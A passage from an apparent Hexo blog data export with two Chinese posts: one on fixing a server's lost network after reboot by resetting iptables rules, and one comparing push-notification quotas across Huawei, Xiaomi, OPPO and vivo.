class=\"line\">iptables -t nat -X</span><br><span class=\"line\"><span class=\"comment\"># 保存一下</span></span><br><span class=\"line\">iptables-save</span><br><span class=\"line\"><span class=\"comment\"># 如果之前也持久化了rules，重新保存，避免重启又失效了</span></span><br><span class=\"line\">iptables-save &gt; /etc/iptables.up.rules</span><br></pre></td></tr></table></figure>\n\n<p>如果涉及IPV6的服务器，上述命令最好换成<code>ip6tables-save</code>再执行一遍。</p>\n<p>最后重启网络服务，成功就能联网了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart networking.service</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>总的来说，还是对iptables机制不熟悉导致的问题，没想到Ubuntu 16.04的网络服务必须要先检查iptables并且全部IP解析成功才能运行。此外，iptables在很多新版本的Linux发行版中已经不使用了，有更好的工具取而代之。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>先说下我的单机环境是Ubuntu 16.04，只放了点小应用，一直没升级系统（懒），防火墙规则也是简单地使用iptables来控制。</p>\n<p>今天我因需要重启服务器之后，发现突然连不上了，ssh无法连接，ping也不通，我开始慌了。于是我只能进入云服务器商的后台，用网页版登录，不管你是阿里云还是腾讯云还是国外的服务商，现在大多都有这种功能。</p>\n<p>进去之后，先任意<code>ping</code>一个公网IP，提示 <strong>“Network is unreachable”</strong> ，看来这互联网是彻底断了。用<code>ifconfig</code>也能发现本机的公网IP看不见了。</p>\n<p>怎么重启一下就这样了呢？</p>\n<h3 id=\"排查\"><a href=\"#排查\" class=\"headerlink\" title=\"排查\"></a>排查</h3><p>直接检查networking服务状态：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl status networking.service</span><br></pre></td></tr></table></figure>\n\n<p>能发现服务运行状态不是Active的，并且提示了是由于iptables规则应用失败，其中可以看见 **“cannot resolve host” **之类的字样，具体现场我没有截图保存，大概是这些内容。</p>\n<p>原因基本上就清楚了，因为我前段时间手动禁用了某些IP来做测试：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP</span><br></pre></td></tr></table></figure>\n\n<p>并且还将规则保存了下来：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables-save &gt; /etc/iptables.up.rules</span><br></pre></td></tr></table></figure>\n\n<p><strong>然后现在这些IP已经找不到了，无法解析，才导致了networking服务启动失败。</strong></p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>简单粗暴一点吧，直接重置所有iptables里自定义的内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 默认策略设置为ACCEPT，否则后续操作会导致连接断开，无法再次连接</span></span><br><span class=\"line\">iptables -P INPUT ACCEPT</span><br><span class=\"line\">iptables -P FORWARD ACCEPT</span><br><span class=\"line\">iptables -P OUTPUT ACCEPT</span><br><span class=\"line\">iptables -t nat -P PREROUTING ACCEPT</span><br><span class=\"line\">iptables -t nat -P POSTROUTING ACCEPT</span><br><span class=\"line\">iptables -t nat -P OUTPUT ACCEPT</span><br><span class=\"line\"><span class=\"comment\"># 清空所有规则</span></span><br><span class=\"line\">iptables -F</span><br><span class=\"line\">iptables -t nat -F</span><br><span class=\"line\"><span class=\"comment\"># 删除所有非系统默认的链</span></span><br><span class=\"line\">iptables -X</span><br><span class=\"line\">iptables -t nat -X</span><br><span class=\"line\"><span class=\"comment\"># 保存一下</span></span><br><span class=\"line\">iptables-save</span><br><span class=\"line\"><span class=\"comment\"># 如果之前也持久化了rules，重新保存，避免重启又失效了</span></span><br><span class=\"line\">iptables-save &gt; /etc/iptables.up.rules</span><br></pre></td></tr></table></figure>\n\n<p>如果涉及IPV6的服务器，上述命令最好换成<code>ip6tables-save</code>再执行一遍。</p>\n<p>最后重启网络服务，成功就能联网了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart networking.service</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>总的来说，还是对iptables机制不熟悉导致的问题，没想到Ubuntu 16.04的网络服务必须要先检查iptables并且全部IP解析成功才能运行。此外，iptables在很多新版本的Linux发行版中已经不使用了，有更好的工具取而代之。</p>\n"},{"layout":"post","title":"谁家推送服务限制最严格","subtitle":"序列未来！","date":"2022-05-16T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"cover":"https://imgconvert.csdnimg.cn/4e5fce56c25947ecb2b67d3ecf168b47.png","_content":"\n>  先说句题外话，又过了这么多年了，没想到国内Android的统一推送还是没有实现。\n\n由于工作需要，最近正好在调研各家系统推送服务，我发现从他们的技术文档可以分析出很多有意思的东西，比如说能看出来哪家厂商的推送限制最严格，最考虑用户的综合体验。在讲解之前，我们先简单提几个推送服务的基本概念：\n\n- 设备：用户所持有的某台设备，在技术文档中所提到的日活跃用户数一般也就指日联网设备数\n- 应用：某台设备上安装的某个应用，后续我们所描述的推送数量限制都是以此维度比较的\n- 推送：应用进程活跃或关闭时，通过系统级的推送通道下发消息，一般以通知消息的形式呈现给用户，点击后激活应用进程\n- 透传：仅在应用活跃时可接收数据，仍然依赖系统的推送服务器下发，但数据格式一般可以自定义，处理逻辑也是由应用自己实现，所以应用如果被杀死，自然就处理不到了\n\n一个不那么规范的示意图：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/4e5fce56c25947ecb2b67d3ecf168b47.png)\n\n**注：下文以x表示日联网设备数量；我们主要关注推送，不过多说明透传的限制。**\n\n### 各家次数限制\n\n#### 华为\n\n对于某设备某应用，推送和透传次数总共不超过**3000次/每日**；相当于该应用每日推送总量上限为：`f(x) = 3000 * x`\n\n简要解读：华为严格限制了某设备某应用所能接收的推送数量，所以对于某应用而言，推送总量和设备数量线性相关。\n\n#### 小米\n\n透传没有数量限制，而推送分为**普通级别**和**重要级别**，重要级别的消息（比如即时通讯消息、个人订单状态变化等）没有数量限制，但需要单独向小米团队申请。下面只说明普通级别的消息：\n\n对于某应用，推送总量上限为**x的数倍/每日**，这个倍数和你的应用分类有关，比如新闻资讯是5倍，时尚购物是2倍，我们以最低的2倍为例，该应用每日推送总量上限为：\n\n- 当x < 10000时，`f(x) = 2 * 10000 = 20000`\n- 当x >= 10000时，`f(x) = 2 * x`\n\n简要解读：从小米推送的官方文档来看，和华为不同，并没有明确限制某设备某应用接收的数量，只限制了某应用对于所有设备的推送总量，换言之，极端情况下，我可以把这个额度全部推给某一台设备。所以你的用户少到一定程度时，单台设备可接收的推送数量会远大于华为的3000次限制。当然，这种极端情况其实属于一种漏洞了，虽然文档确实没有说明，但估计是不可行的。\n\n#### OPPO\n\n不支持透传，推送分为**公信**和**私信**，私信类似小米的重要级别消息，不限量，需要单独申请。下面只说明公信：\n\n对于某应用，推送总量上限为**2x/每日**，该应用每日推送总量上限为：\n\n- 当x < 50000时，`f(x) = 2 * 50000 = 100000`\n- 当x >= 50000时，`f(x) = 2 * x`\n\n对于某设备，公信和私信总和接收数上限为**2000/每日**。\n\n简要解读：OPPO的规则和小米非常类似，但没有像小米那样按应用分类给不同的倍数，而是固定为2倍。且对于某设备，无论公信还是私信，每日接收推送的总和上限为2000，也就是说该设备无论有多少个应用接入了OPPO推送，其每日接收总量固定。所以即便你申请了私信总量无限，但单一用户仍然有限。\n\n#### vivo\n\n不支持透传，推送分为**运营消息**和**系统消息**，类似小米和OPPO，但又不尽相同，vivo的系统消息默认是可以直接使用的，不向小米和OPPO那样需要申请，只不过每日推送总量限制与运营消息相同，为**x的1倍**。系统消息虽然在文档中声称**不限制某设备某应用的接收数量**，但实际上有总量限制，所以某一台设备接收最大数也就是总量，如果需要增量再向官方申请（但至于可以申请多少，肯定也不是无限的）。下面只说明运营消息：\n\n对于某应用，推送总量上限为**x/每日**，该应用每日推送总量上限为：\n\n- 当x < 10000时，`f(x) = 10000`\n- 当x >= 10000时，`f(x) = x`\n\n对于某设备某应用，运营消息接收数上限为**5/每日**，系统消息则为**无限/每日**。\n\n简单解读：vivo的限制规则和其他家有很大不同，对于某设备某应用的普通运营消息做了很严格的控制，每天仅为5条，因此该设备当天总接收量取决于所安装的集成了vivo系统推送的应用数，这和OPPO直接限制成2000/每日有些许差异。\n\n### 横向对比\n\n在分析完上述各家推送的文档之后，我们从两个角度来进行对比。\n\n#### 从开发者角度\n\n作为应用开发者，我们比较关心的是每天总共可以推送多少消息出去，将上文函数绘制出来就非常清楚了：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/bad73233601542c4b7fd74125153a8be.png#pic_center)\n\n在单个应用每天可推送总量这个指标上看，华为对应函数的斜率是3000，可谓是一骑绝尘，给到普通开发者的资源也算非常慷慨的了。然后再单独看其他三家吧：\n\n- 当设备数小于1万时，可推送总量：OPPO > 小米 > vivo。\n- 当设备数介于1万到5万之间时，可推送总量依然是：OPPO > 小米 > vivo，但小米与vivo的差距随着设备数增多而增大；\n- 当设备数大于5万时，可推送总量：OPPO = 小米 > vivo，此时OPPO和小米已经一致，并与vivo的差距越来越大。\n\n因此对开发者来说，总体上可推送数量对比：华为 > OPPO > 小米 > vivo。~~没错，产品运营同学们可以对华为用户加大营销力度了。~~\n\n#### 从用户角度\n\n刚刚提到的总量其实并不是用户最关心的，由于各家厂商的规则各异，我们更关心的是**某设备每天能收到的推送数量上限**。\n\n因此我们**以y表示某设备所安装的应用数**（接入了对应系统推送的），得出如下函数：\n\n- 华为：`f(y) = 3000 * y`\n- 小米：由于其官方文档并没有对设备维度作说明，只能按平均值计算，所以是`f(y) = (2 + 5) / 2 * y = 3.5 * y`，2和5分别为上文提到的不同应用分类限制倍数的最小值和最大值，其实更为合理的是按所安装应用类型的分布来计算。\n- OPPO：与安装应用数量无关，`f(y) = 2000`\n- vivo：`f(y) = 5 * y`\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/bc8747ae84f048958bff82a0db5e0865.png#pic_center)\n\n由图可知，对用户来讲，不同厂商推送对所安装应用数量的敏感度是不一样的，每天能收到的推送数量上限情况如下：\n\n- 当安装应用数量小于400时，华为 > OPPO > vivo > 小米\n- 当安装应用数量介于400到（约）571时，华为 > vivo > OPPO > 小米\n- 当安装应用数量大于（约）571时，华为 > vivo > 小米 > OPPO\n\n总体看来，华为依然是一骑绝尘，不管你安装多少应用，收到的推送数量都是最多的，换言之，也是理论上用户体验最不好的。从函数图像上来看，结合实际情况（一般人不会安装超过400个应用）vivo和小米推送是管控相对较为严格的，理论上用户体验最佳。OPPO相对而言比较简单粗暴，这对于轻度用户来说不是很友好。\n\n上述结论是完全基于官方文档的说明来进行的数据分析，它更多是表明了对于开发者和用户的可影响程度。在实际体验中，几家厂商并没有太大差异，最终影响用户设备接收推送体验的因素也非常复杂，可能应用的开发者针对不同用户也有不同频次的推送，也可能用户有自己的应用设置习惯，所以每个人的感受也千差万别。此外，即便开发者不对用户体验负责，厂商的推送平台还是会对大家负责的，毕竟任何异常量级的数据都会受到风控的，而且对于滥用推送的开发者，平台也会有相应的处罚机制。\n\n### 参考\n\n- [小米文档中心](https://dev.mi.com/console/doc/detail?pId=2086)\n- [华为推送服务](https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides/faq-0000001050042183#section196822541234)\n- [OPPO开放平台](https://open.oppomobile.com/wiki/doc#id=11210)\n- [vivo开放平台](https://dev.vivo.com.cn/documentCenter/doc/359#_Toc64906673)\n\n### 关于Apple\n\n我也看了一下Apple的推送服务文档，并没有提到相关的限制，所以我这里没有做相关分析，也许要开发者帐号才能查看？欢迎熟悉这方面业务的同学评论。\n","source":"_posts/2022-05-17-谁家推送服务限制最严格.md","raw":"---\nlayout:     post\ntitle:      谁家推送服务限制最严格\nsubtitle:   序列未来！\ndate:       2022-05-17\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ncover: https://imgconvert.csdnimg.cn/4e5fce56c25947ecb2b67d3ecf168b47.png\ntags:\n    - Android\n---\n\n>  先说句题外话，又过了这么多年了，没想到国内Android的统一推送还是没有实现。\n\n由于工作需要，最近正好在调研各家系统推送服务，我发现从他们的技术文档可以分析出很多有意思的东西，比如说能看出来哪家厂商的推送限制最严格，最考虑用户的综合体验。在讲解之前，我们先简单提几个推送服务的基本概念：\n\n- 设备：用户所持有的某台设备，在技术文档中所提到的日活跃用户数一般也就指日联网设备数\n- 应用：某台设备上安装的某个应用，后续我们所描述的推送数量限制都是以此维度比较的\n- 推送：应用进程活跃或关闭时，通过系统级的推送通道下发消息，一般以通知消息的形式呈现给用户，点击后激活应用进程\n- 透传：仅在应用活跃时可接收数据，仍然依赖系统的推送服务器下发，但数据格式一般可以自定义，处理逻辑也是由应用自己实现，所以应用如果被杀死，自然就处理不到了\n\n一个不那么规范的示意图：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/4e5fce56c25947ecb2b67d3ecf168b47.png)\n\n**注：下文以x表示日联网设备数量；我们主要关注推送，不过多说明透传的限制。**\n\n### 各家次数限制\n\n#### 华为\n\n对于某设备某应用，推送和透传次数总共不超过**3000次/每日**；相当于该应用每日推送总量上限为：`f(x) = 3000 * x`\n\n简要解读：华为严格限制了某设备某应用所能接收的推送数量，所以对于某应用而言，推送总量和设备数量线性相关。\n\n#### 小米\n\n透传没有数量限制，而推送分为**普通级别**和**重要级别**，重要级别的消息（比如即时通讯消息、个人订单状态变化等）没有数量限制，但需要单独向小米团队申请。下面只说明普通级别的消息：\n\n对于某应用，推送总量上限为**x的数倍/每日**，这个倍数和你的应用分类有关，比如新闻资讯是5倍，时尚购物是2倍，我们以最低的2倍为例，该应用每日推送总量上限为：\n\n- 当x < 10000时，`f(x) = 2 * 10000 = 20000`\n- 当x >= 10000时，`f(x) = 2 * x`\n\n简要解读：从小米推送的官方文档来看，和华为不同，并没有明确限制某设备某应用接收的数量，只限制了某应用对于所有设备的推送总量，换言之，极端情况下，我可以把这个额度全部推给某一台设备。所以你的用户少到一定程度时，单台设备可接收的推送数量会远大于华为的3000次限制。当然，这种极端情况其实属于一种漏洞了，虽然文档确实没有说明，但估计是不可行的。\n\n#### OPPO\n\n不支持透传，推送分为**公信**和**私信**，私信类似小米的重要级别消息，不限量，需要单独申请。下面只说明公信：\n\n对于某应用，推送总量上限为**2x/每日**，该应用每日推送总量上限为：\n\n- 当x < 50000时，`f(x) = 2 * 50000 = 100000`\n- 当x >= 50000时，`f(x) = 2 * x`\n\n对于某设备，公信和私信总和接收数上限为**2000/每日**。\n\n简要解读：OPPO的规则和小米非常类似，但没有像小米那样按应用分类给不同的倍数，而是固定为2倍。且对于某设备，无论公信还是私信，每日接收推送的总和上限为2000，也就是说该设备无论有多少个应用接入了OPPO推送，其每日接收总量固定。所以即便你申请了私信总量无限，但单一用户仍然有限。\n\n#### vivo\n\n不支持透传，推送分为**运营消息**和**系统消息**，类似小米和OPPO，但又不尽相同，vivo的系统消息默认是可以直接使用的，不向小米和OPPO那样需要申请，只不过每日推送总量限制与运营消息相同，为**x的1倍**。系统消息虽然在文档中声称**不限制某设备某应用的接收数量**，但实际上有总量限制，所以某一台设备接收最大数也就是总量，如果需要增量再向官方申请（但至于可以申请多少，肯定也不是无限的）。下面只说明运营消息：\n\n对于某应用，推送总量上限为**x/每日**，该应用每日推送总量上限为：\n\n- 当x < 10000时，`f(x) = 10000`\n- 当x >= 10000时，`f(x) = x`\n\n对于某设备某应用，运营消息接收数上限为**5/每日**，系统消息则为**无限/每日**。\n\n简单解读：vivo的限制规则和其他家有很大不同，对于某设备某应用的普通运营消息做了很严格的控制，每天仅为5条，因此该设备当天总接收量取决于所安装的集成了vivo系统推送的应用数，这和OPPO直接限制成2000/每日有些许差异。\n\n### 横向对比\n\n在分析完上述各家推送的文档之后，我们从两个角度来进行对比。\n\n#### 从开发者角度\n\n作为应用开发者，我们比较关心的是每天总共可以推送多少消息出去，将上文函数绘制出来就非常清楚了：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/bad73233601542c4b7fd74125153a8be.png#pic_center)\n\n在单个应用每天可推送总量这个指标上看，华为对应函数的斜率是3000，可谓是一骑绝尘，给到普通开发者的资源也算非常慷慨的了。然后再单独看其他三家吧：\n\n- 当设备数小于1万时，可推送总量：OPPO > 小米 > vivo。\n- 当设备数介于1万到5万之间时，可推送总量依然是：OPPO > 小米 > vivo，但小米与vivo的差距随着设备数增多而增大；\n- 当设备数大于5万时，可推送总量：OPPO = 小米 > vivo，此时OPPO和小米已经一致，并与vivo的差距越来越大。\n\n因此对开发者来说，总体上可推送数量对比：华为 > OPPO > 小米 > vivo。~~没错，产品运营同学们可以对华为用户加大营销力度了。~~\n\n#### 从用户角度\n\n刚刚提到的总量其实并不是用户最关心的，由于各家厂商的规则各异，我们更关心的是**某设备每天能收到的推送数量上限**。\n\n因此我们**以y表示某设备所安装的应用数**（接入了对应系统推送的），得出如下函数：\n\n- 华为：`f(y) = 3000 * y`\n- 小米：由于其官方文档并没有对设备维度作说明，只能按平均值计算，所以是`f(y) = (2 + 5) / 2 * y = 3.5 * y`，2和5分别为上文提到的不同应用分类限制倍数的最小值和最大值，其实更为合理的是按所安装应用类型的分布来计算。\n- OPPO：与安装应用数量无关，`f(y) = 2000`\n- vivo：`f(y) = 5 * y`\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/bc8747ae84f048958bff82a0db5e0865.png#pic_center)\n\n由图可知，对用户来讲，不同厂商推送对所安装应用数量的敏感度是不一样的，每天能收到的推送数量上限情况如下：\n\n- 当安装应用数量小于400时，华为 > OPPO > vivo > 小米\n- 当安装应用数量介于400到（约）571时，华为 > vivo > OPPO > 小米\n- 当安装应用数量大于（约）571时，华为 > vivo > 小米 > OPPO\n\n总体看来，华为依然是一骑绝尘，不管你安装多少应用，收到的推送数量都是最多的，换言之，也是理论上用户体验最不好的。从函数图像上来看，结合实际情况（一般人不会安装超过400个应用）vivo和小米推送是管控相对较为严格的，理论上用户体验最佳。OPPO相对而言比较简单粗暴，这对于轻度用户来说不是很友好。\n\n上述结论是完全基于官方文档的说明来进行的数据分析，它更多是表明了对于开发者和用户的可影响程度。在实际体验中，几家厂商并没有太大差异，最终影响用户设备接收推送体验的因素也非常复杂，可能应用的开发者针对不同用户也有不同频次的推送，也可能用户有自己的应用设置习惯，所以每个人的感受也千差万别。此外，即便开发者不对用户体验负责，厂商的推送平台还是会对大家负责的，毕竟任何异常量级的数据都会受到风控的，而且对于滥用推送的开发者，平台也会有相应的处罚机制。\n\n### 参考\n\n- [小米文档中心](https://dev.mi.com/console/doc/detail?pId=2086)\n- [华为推送服务](https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides/faq-0000001050042183#section196822541234)\n- [OPPO开放平台](https://open.oppomobile.com/wiki/doc#id=11210)\n- [vivo开放平台](https://dev.vivo.com.cn/documentCenter/doc/359#_Toc64906673)\n\n### 关于Apple\n\n我也看了一下Apple的推送服务文档，并没有提到相关的限制，所以我这里没有做相关分析，也许要开发者帐号才能查看？欢迎熟悉这方面业务的同学评论。\n","slug":"谁家推送服务限制最严格","published":1,"updated":"2024-03-25T07:31:25.988Z","comments":1,"photos":[],"link":"","_id":"cluaufh1l004tthe6c6ama390","content":"<blockquote>\n<p> 先说句题外话，又过了这么多年了，没想到国内Android的统一推送还是没有实现。</p>\n</blockquote>\n<p>由于工作需要，最近正好在调研各家系统推送服务，我发现从他们的技术文档可以分析出很多有意思的东西，比如说能看出来哪家厂商的推送限制最严格，最考虑用户的综合体验。在讲解之前，我们先简单提几个推送服务的基本概念：</p>\n<ul>\n<li>设备：用户所持有的某台设备，在技术文档中所提到的日活跃用户数一般也就指日联网设备数</li>\n<li>应用：某台设备上安装的某个应用，后续我们所描述的推送数量限制都是以此维度比较的</li>\n<li>推送：应用进程活跃或关闭时，通过系统级的推送通道下发消息，一般以通知消息的形式呈现给用户，点击后激活应用进程</li>\n<li>透传：仅在应用活跃时可接收数据，仍然依赖系统的推送服务器下发，但数据格式一般可以自定义，处理逻辑也是由应用自己实现，所以应用如果被杀死，自然就处理不到了</li>\n</ul>\n<p>一个不那么规范的示意图：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/4e5fce56c25947ecb2b67d3ecf168b47.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>注：下文以x表示日联网设备数量；我们主要关注推送，不过多说明透传的限制。</strong></p>\n<h3 id=\"各家次数限制\"><a href=\"#各家次数限制\" class=\"headerlink\" title=\"各家次数限制\"></a>各家次数限制</h3><h4 id=\"华为\"><a href=\"#华为\" class=\"headerlink\" title=\"华为\"></a>华为</h4><p>对于某设备某应用，推送和透传次数总共不超过<strong>3000次&#x2F;每日</strong>；相当于该应用每日推送总量上限为：<code>f(x) = 3000 * x</code></p>\n<p>简要解读：华为严格限制了某设备某应用所能接收的推送数量，所以对于某应用而言，推送总量和设备数量线性相关。</p>\n<h4 id=\"小米\"><a href=\"#小米\" class=\"headerlink\" title=\"小米\"></a>小米</h4><p>透传没有数量限制，而推送分为<strong>普通级别</strong>和<strong>重要级别</strong>，重要级别的消息（比如即时通讯消息、个人订单状态变化等）没有数量限制，但需要单独向小米团队申请。下面只说明普通级别的消息：</p>\n<p>对于某应用，推送总量上限为<strong>x的数倍&#x2F;每日</strong>，这个倍数和你的应用分类有关，比如新闻资讯是5倍，时尚购物是2倍，我们以最低的2倍为例，该应用每日推送总量上限为：</p>\n<ul>\n<li>当x &lt; 10000时，<code>f(x) = 2 * 10000 = 20000</code></li>\n<li>当x &gt;&#x3D; 10000时，<code>f(x) = 2 * x</code></li>\n</ul>\n<p>简要解读：从小米推送的官方文档来看，和华为不同，并没有明确限制某设备某应用接收的数量，只限制了某应用对于所有设备的推送总量，换言之，极端情况下，我可以把这个额度全部推给某一台设备。所以你的用户少到一定程度时，单台设备可接收的推送数量会远大于华为的3000次限制。当然，这种极端情况其实属于一种漏洞了，虽然文档确实没有说明，但估计是不可行的。</p>\n<h4 id=\"OPPO\"><a href=\"#OPPO\" class=\"headerlink\" title=\"OPPO\"></a>OPPO</h4><p>不支持透传，推送分为<strong>公信</strong>和<strong>私信</strong>，私信类似小米的重要级别消息，不限量，需要单独申请。下面只说明公信：</p>\n<p>对于某应用，推送总量上限为<strong>2x&#x2F;每日</strong>，该应用每日推送总量上限为：</p>\n<ul>\n<li>当x &lt; 50000时，<code>f(x) = 2 * 50000 = 100000</code></li>\n<li>当x &gt;&#x3D; 50000时，<code>f(x) = 2 * x</code></li>\n</ul>\n<p>对于某设备，公信和私信总和接收数上限为<strong>2000&#x2F;每日</strong>。</p>\n<p>简要解读：OPPO的规则和小米非常类似，但没有像小米那样按应用分类给不同的倍数，而是固定为2倍。且对于某设备，无论公信还是私信，每日接收推送的总和上限为2000，也就是说该设备无论有多少个应用接入了OPPO推送，其每日接收总量固定。所以即便你申请了私信总量无限，但单一用户仍然有限。</p>\n<h4 id=\"vivo\"><a href=\"#vivo\" class=\"headerlink\" title=\"vivo\"></a>vivo</h4><p>不支持透传，推送分为<strong>运营消息</strong>和<strong>系统消息</strong>，类似小米和OPPO，但又不尽相同，vivo的系统消息默认是可以直接使用的，不向小米和OPPO那样需要申请，只不过每日推送总量限制与运营消息相同，为<strong>x的1倍</strong>。系统消息虽然在文档中声称<strong>不限制某设备某应用的接收数量</strong>，但实际上有总量限制，所以某一台设备接收最大数也就是总量，如果需要增量再向官方申请（但至于可以申请多少，肯定也不是无限的）。下面只说明运营消息：</p>\n<p>对于某应用，推送总量上限为<strong>x&#x2F;每日</strong>，该应用每日推送总量上限为：</p>\n<ul>\n<li>当x &lt; 10000时，<code>f(x) = 10000</code></li>\n<li>当x &gt;&#x3D; 10000时，<code>f(x) = x</code></li>\n</ul>\n<p>对于某设备某应用，运营消息接收数上限为<strong>5&#x2F;每日</strong>，系统消息则为<strong>无限&#x2F;每日</strong>。</p>\n<p>简单解读：vivo的限制规则和其他家有很大不同，对于某设备某应用的普通运营消息做了很严格的控制，每天仅为5条，因此该设备当天总接收量取决于所安装的集成了vivo系统推送的应用数，这和OPPO直接限制成2000&#x2F;每日有些许差异。</p>\n<h3 id=\"横向对比\"><a href=\"#横向对比\" class=\"headerlink\" title=\"横向对比\"></a>横向对比</h3><p>在分析完上述各家推送的文档之后，我们从两个角度来进行对比。</p>\n<h4 id=\"从开发者角度\"><a href=\"#从开发者角度\" class=\"headerlink\" title=\"从开发者角度\"></a>从开发者角度</h4><p>作为应用开发者，我们比较关心的是每天总共可以推送多少消息出去，将上文函数绘制出来就非常清楚了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/bad73233601542c4b7fd74125153a8be.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>在单个应用每天可推送总量这个指标上看，华为对应函数的斜率是3000，可谓是一骑绝尘，给到普通开发者的资源也算非常慷慨的了。然后再单独看其他三家吧：</p>\n<ul>\n<li>当设备数小于1万时，可推送总量：OPPO &gt; 小米 &gt; vivo。</li>\n<li>当设备数介于1万到5万之间时，可推送总量依然是：OPPO &gt; 小米 &gt; vivo，但小米与vivo的差距随着设备数增多而增大；</li>\n<li>当设备数大于5万时，可推送总量：OPPO &#x3D; 小米 &gt; vivo，此时OPPO和小米已经一致，并与vivo的差距越来越大。</li>\n</ul>\n<p>因此对开发者来说，总体上可推送数量对比：华为 &gt; OPPO &gt; 小米 &gt; vivo。<del>没错，产品运营同学们可以对华为用户加大营销力度了。</del></p>\n<h4 id=\"从用户角度\"><a href=\"#从用户角度\" class=\"headerlink\" title=\"从用户角度\"></a>从用户角度</h4><p>刚刚提到的总量其实并不是用户最关心的，由于各家厂商的规则各异，我们更关心的是<strong>某设备每天能收到的推送数量上限</strong>。</p>\n<p>因此我们<strong>以y表示某设备所安装的应用数</strong>（接入了对应系统推送的），得出如下函数：</p>\n<ul>\n<li>华为：<code>f(y) = 3000 * y</code></li>\n<li>小米：由于其官方文档并没有对设备维度作说明，只能按平均值计算，所以是<code>f(y) = (2 + 5) / 2 * y = 3.5 * y</code>，2和5分别为上文提到的不同应用分类限制倍数的最小值和最大值，其实更为合理的是按所安装应用类型的分布来计算。</li>\n<li>OPPO：与安装应用数量无关，<code>f(y) = 2000</code></li>\n<li>vivo：<code>f(y) = 5 * y</code></li>\n</ul>\n<p><img src=\"https://imgconvert.csdnimg.cn/bc8747ae84f048958bff82a0db5e0865.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>由图可知，对用户来讲，不同厂商推送对所安装应用数量的敏感度是不一样的，每天能收到的推送数量上限情况如下：</p>\n<ul>\n<li>当安装应用数量小于400时，华为 &gt; OPPO &gt; vivo &gt; 小米</li>\n<li>当安装应用数量介于400到（约）571时，华为 &gt; vivo &gt; OPPO &gt; 小米</li>\n<li>当安装应用数量大于（约）571时，华为 &gt; vivo &gt; 小米 &gt; OPPO</li>\n</ul>\n<p>总体看来，华为依然是一骑绝尘，不管你安装多少应用，收到的推送数量都是最多的，换言之，也是理论上用户体验最不好的。从函数图像上来看，结合实际情况（一般人不会安装超过400个应用）vivo和小米推送是管控相对较为严格的，理论上用户体验最佳。OPPO相对而言比较简单粗暴，这对于轻度用户来说不是很友好。</p>\n<p>上述结论是完全基于官方文档的说明来进行的数据分析，它更多是表明了对于开发者和用户的可影响程度。在实际体验中，几家厂商并没有太大差异，最终影响用户设备接收推送体验的因素也非常复杂，可能应用的开发者针对不同用户也有不同频次的推送，也可能用户有自己的应用设置习惯，所以每个人的感受也千差万别。此外，即便开发者不对用户体验负责，厂商的推送平台还是会对大家负责的，毕竟任何异常量级的数据都会受到风控的，而且对于滥用推送的开发者，平台也会有相应的处罚机制。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://dev.mi.com/console/doc/detail?pId=2086\">小米文档中心</a></li>\n<li><a href=\"https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides/faq-0000001050042183#section196822541234\">华为推送服务</a></li>\n<li><a 